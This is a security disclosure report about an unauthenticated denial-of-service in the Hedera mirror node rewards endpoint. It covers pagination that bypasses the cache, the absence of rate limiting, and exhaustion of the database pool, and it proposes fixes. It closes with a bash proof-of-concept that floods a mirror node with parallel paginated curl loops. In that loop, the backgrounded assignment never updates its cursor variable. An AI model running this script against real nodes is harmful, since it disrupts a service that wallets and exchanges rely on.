### Title
Unauthenticated Pagination-Driven Database Resource Exhaustion via `/accounts/:id/rewards`

### Summary
The `listStakingRewardsByAccountId()` function in `rest/controllers/accountController.js` generates a `next` pagination link whenever `response.rewards.length === query.limit`. The REST API has no per-IP rate limiting, and each paginated request issues at least two independent database queries against the mirror node's PostgreSQL pool. An unauthenticated attacker using automated tooling to follow pagination links in a tight loop — across multiple concurrent connections — can sustain a high-frequency stream of DB queries that exhausts the connection pool and degrades or halts all mirror node read operations.

### Finding Description

**Exact code path:**

`rest/controllers/accountController.js`, `listStakingRewardsByAccountId()`, lines 170–203:

```js
// Line 172: DB query 1 — account existence check
const isValidAccount = await EntityService.isValidAccount(accountId);
// Line 180: DB query 2 — staking rewards SELECT
const stakingRewardsTransfers = await StakingRewardTransferService.getRewards(...);
// Line 194: next link generated when full page returned
if (response.rewards.length === query.limit) {
  response.links.next = utils.getPaginationLink(req, false, lastValue, query.order);
}
```

The underlying SQL (`rest/service/stakingRewardTransferService.js`, lines 11–16) is a straightforward unbounded scan of `staking_reward_transfer` filtered only by `account_id` and a timestamp cursor:

```sql
SELECT srt.account_id, srt.amount, srt.consensus_timestamp
FROM staking_reward_transfer srt
WHERE srt.account_id = $1
  [AND srt.consensus_timestamp <op> $N]
ORDER BY srt.consensus_timestamp desc
LIMIT $2
```

**Root cause — failed assumptions:**

1. **No rate limiting on the REST Node.js service.** `rest/server.js` registers no per-IP throttle middleware. The bucket4j throttle (`web3/src/main/java/.../ThrottleManagerImpl.java`) applies only to the separate `web3` Java service, not to this REST API.
2. **Response cache is bypassed.** Each pagination `next` link embeds a unique `timestamp` cursor value (`lastRow.timestamp`). Every page is a distinct URL, so `responseCacheCheckHandler` never produces a cache hit for any page beyond the first.
3. **Two DB queries per HTTP request.** `isValidAccount` (line 172) and `getRewards` (line 180) each hit the database independently. A single attacker request costs two DB round-trips.
4. **Limit cap does not bound request rate.** `getLimitParamValue` caps the `limit` parameter at `max` (100 by default, confirmed in `rest/__tests__/config.test.js` line 325), but this only limits rows per page — it does not limit how many pages per second an attacker can request.

### Impact Explanation

The PostgreSQL connection pool (`db.pool.maxConnections`) is finite. Sustained high-frequency pagination requests from one or more unauthenticated clients fill the pool with long-running queries. Once the pool is saturated, all other mirror node endpoints — including those used to confirm transaction status — begin queuing or timing out. Because the mirror node is the canonical read layer for Hedera network state, exhausting its database effectively denies transaction visibility to wallets, exchanges, and network tooling, constituting a practical network-level service disruption.

### Likelihood Explanation

Preconditions are minimal: the attacker needs only a valid account ID (all account IDs are public and enumerable) and a script that follows `links.next` in a loop. No authentication, no special knowledge, and no privileged access is required. The attack is trivially repeatable and can be amplified by running concurrent pagination loops against multiple high-reward accounts simultaneously. The absence of any IP-level rate limiting or connection throttling in the REST service makes sustained exploitation straightforward.

### Recommendation

1. **Add per-IP rate limiting middleware** to the Express REST server (e.g., `express-rate-limit`) applied globally before route handlers, with a low burst ceiling for unauthenticated clients.
2. **Merge the two sequential DB queries** — fold the account-existence check into the rewards query (e.g., `LEFT JOIN entity`) so each HTTP request costs at most one DB round-trip.
3. **Apply a global DB query statement timeout** (already partially supported via `db.pool.statementTimeout` in `rest/config.js` line 139) and ensure it is set aggressively enough to shed runaway pagination queries quickly.
4. **Consider cursor-based cache keying** or a short TTL cache on paginated reward responses to absorb repeated identical cursor requests.

### Proof of Concept

```bash
# Step 1: Identify any valid account with staking rewards (public information)
ACCOUNT="0.0.800"   # treasury/staking account — guaranteed to have many reward rows

# Step 2: Fetch first page at maximum allowed limit
NEXT=$(curl -s "https://<mirror-node>/api/v1/accounts/${ACCOUNT}/rewards?limit=100&order=desc" \
  | jq -r '.links.next')

# Step 3: Follow pagination in a tight loop — no auth required
while [ "$NEXT" != "null" ] && [ -n "$NEXT" ]; do
  NEXT=$(curl -s "https://<mirror-node>${NEXT}" | jq -r '.links.next') &
done

# Step 4: Run multiple parallel instances of Step 3 to saturate the DB pool
for i in $(seq 1 50); do
  bash exploit.sh &
done
```

Each iteration fires two DB queries (account validation + rewards SELECT) against unique URLs that bypass the response cache. With 50 concurrent loops at 100 rows/page, the DB connection pool is exhausted within seconds, causing all mirror node endpoints to return errors or time out.
